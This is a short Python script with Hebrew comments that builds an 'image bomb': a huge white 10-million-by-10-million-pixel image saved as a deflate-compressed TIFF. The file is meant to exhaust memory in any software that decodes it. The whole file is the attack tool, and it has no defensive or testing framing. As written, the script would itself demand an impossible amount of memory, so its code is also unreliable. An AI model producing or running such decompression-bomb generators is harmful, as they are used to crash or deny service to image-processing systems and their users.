from PIL import Image

# גודל תמונה "מפוצץ"
width, height = 10000000, 10000000

# ניצור תמונה בצבע לבן
img = Image.new('RGB', (width, height), color='white')

# נשמור כ-TIFF עם דחיסה
img.save('image_bomb.tiff', compression='tiff_deflate')

print("✅ פצצת תמונה נוצרה בהצלחה: image_bomb.tiff")
